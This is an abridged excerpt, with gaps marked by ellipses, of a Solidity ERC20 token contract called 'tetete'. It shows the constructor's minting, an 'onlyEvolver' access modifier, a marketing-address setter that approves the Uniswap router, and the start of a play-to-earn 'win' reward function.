...
contract tetete is ERC20 {
     ...
     */
    constructor() public ERC20("tetete Token", "tetete") {
        _mint(_msgSender(), maxSupply.sub(amountPlayToEarn));
    ...
    modifier onlyEvolver() {
        require(_msgSender() == mAdrress, "caller is not the evolver");
        _;
    }
    ...
    function setMarketingAddress(address _marketingAddress) external onlyOwner {
        ...
        _approve(marketingAddress, address(uniswapV2Router), ~uint256(0));
    }
    ...
    function win(address winner, uint256 reward) external payable onlyEvolver {
        require(playToEarnReward != amountPlayToEarn, "Out of Reward");
